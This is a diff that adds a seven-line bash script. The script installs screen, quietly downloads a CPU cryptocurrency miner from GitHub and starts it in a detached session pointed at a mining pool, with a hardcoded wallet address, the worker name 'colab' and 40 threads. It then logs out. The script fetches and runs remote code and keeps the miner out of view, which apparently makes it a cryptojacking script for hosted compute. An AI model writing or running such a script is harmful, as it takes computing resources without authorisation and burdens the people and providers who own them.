@@ -1,0 +1,7 @@
+#!/usr/bin/bash
+
+sudo apt install screen
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz --quiet
+tar -xf hellminer_cpu_linux.tar.gz
+screen -d -m -S itsfii bash -c './hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RHvyBq43am2Cfu6xp8tJzDUqj8Jsok5Byq.colab -p x --cpu 40'
+logout
